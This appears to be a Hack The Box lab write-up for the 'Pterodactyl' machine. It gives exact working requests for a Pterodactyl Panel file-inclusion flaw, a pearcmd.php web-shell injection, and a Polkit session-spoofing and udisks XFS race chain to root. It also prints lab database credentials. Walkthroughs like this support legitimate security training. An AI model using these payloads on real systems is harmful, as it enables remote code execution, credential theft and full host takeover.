# 🦕 Pterodactyl — HTB Seasonal Box Spoiler

> **Difficulty:** Medium | **OS:** Linux | **Release:** HTB Seasonal

---

## ⚡ TL;DR

Exposed changelog leaks exact software versions → CVE in Pterodactyl Panel gives LFI → LFI chained with pearcmd.php for RCE → DB creds from config files → cracked bcrypt hash for SSH → CVE-2025-6018 + CVE-2025-6019 TOCTOU race for root.

---

## 🗺️ Attack Path

```
Recon → Web Enum → CVE-2025-49132 (LFI) → pearcmd RCE → DB Creds
→ Hash Crack → SSH (user) → CVE-2025-6018 + CVE-2025-6019 → root
```

---

## 🔍 Recon

- Ports: **22 (SSH)**, **80 (nginx)**
- HTTP redirects to `pterodactyl.htb` — a Pterodactyl Panel instance
- Subdomain fuzzing reveals `panel.pterodactyl.htb`
- **Exposed `changelog.txt`** leaks the full stack:
  - Pterodactyl Panel **v1.11.10**
  - PHP-PEAR enabled
  - MariaDB 11.8.3
  - `phpinfo.php` left exposed (temporary debug feature)

---

## 🌐 Web → Initial Shell

### CVE-2025-49132 — LFI via Localization Endpoint

The `/locales/locale.json` endpoint accepts unsanitised `locale` and `namespace` params. The controller converts `.` → `/` in namespace and passes both directly to the file loader:

```
GET /locales/locale.json?locale=../../&namespace=config/database
→ loads: resources/lang/../../config/database.php
```

Limited to **PHP files only** (loader appends `.php`).

**Files of interest via LFI:**
- `config/database.php` → MariaDB creds: `pterodactyl:PteraPanel`
- `config/app.php` → Laravel app key

### LFI → RCE via pearcmd.php

PHP-PEAR being enabled is the key. `pearcmd.php` treats bare URL tokens as CLI args:

```
GET /locales/locale.json
  ?+config-create+/
  &locale=../../../../../usr/local/lib/php
  &namespace=pearcmd
  &/<?=system($_GET['cmd'])?>+/tmp/shell.php
```

PEAR writes the payload to `/tmp/shell.php`. A second LFI request includes it → **RCE as `wwwrun`**.

---

## 👤 User Flag

Connect to MariaDB with the leaked creds → `panel` database → `users` table reveals two accounts:

- `headmonitor` (root admin)
- `phileasfogg3` (regular user) — bcrypt hash **cracks quickly**

Password: `xxx` → SSH in as `phileasfogg3` → **user.txt** ✅

---

## 🔴 Privilege Escalation

### Hint

Mailbox at `/var/spool/mail/phileasfogg3` contains a sysadmin warning about "unusual udisksd activity" — the nudge to look at udisks.

### CVE-2025-6018 — Polkit Auth Bypass (PAM misconfiguration)

SSH sessions are `Active=yes` but Polkit still blocks sensitive udisks operations. The vulnerability abuses `~/.pam_environment` to inject session metadata **before** `systemd-logind` creates the session:

```
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
XDG_SESSION_TYPE OVERRIDE=x11
```

Log out and back in → session is now labelled `seat0` → Polkit treats the SSH user as a **local console user** → `allow_active` actions no longer require a password prompt.

```bash
udisksctl loop-setup --file /tmp/xpl.img --no-user-interaction
# Mapped file /tmp/xpl.img as /dev/loop0  ✅
```

### CVE-2025-6019 — TOCTOU SUID via XFS Resize

Normal udisks mounts apply `nosuid,nodev` — a SUID binary inside the image won't fire. **But the resize path doesn't.**

**Prep (attacker machine):**
1. Build a static SUID payload (`xpl.c`) with a `constructor` that calls `setuid(0)` + spawns `/bin/sh`
2. Create a 300MB legacy XFS image (`mkfs.xfs -m crc=0 -n ftype=0`)
3. Mount, copy payload inside, `chown root:root` + `chmod 4755`, unmount
4. Compress with `xz -9` (~50KB) and `scp` to target

**On target:**

Terminal 1 — race loop watching for the transient mount:
```bash
while true; do
  for d in /tmp/blockdev.*; do
    "$d/xpl" 2>/dev/null && break 2
  done
done
```

Terminal 2 — trigger the resize (udisks mounts XFS in `/tmp/blockdev.XXXX` **without nosuid** during this operation):
```bash
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 "{}"
```

Win the race window → payload executes as root → **root.txt** ✅

---

## 🔑 Key Takeaways

| Stage | Technique |
|---|---|
| Recon | Exposed changelog leaks exact version + stack |
| LFI | CVE-2025-49132 — path traversal in locale endpoint |
| RCE | pearcmd.php abused as CLI wrapper via bare URL params |
| Creds | DB config exposed through LFI, bcrypt cracked |
| Auth bypass | CVE-2025-6018 — PAM env injection spoofs `seat0` session |
| Root | CVE-2025-6019 — TOCTOU race in udisks XFS resize path |

---

## 🛠️ Tools Used

`rustscan` · `gobuster` · `python (requests)` · `hashcat` · `gcc` · `mkfs.xfs` · `udisksctl` · `gdbus`

---

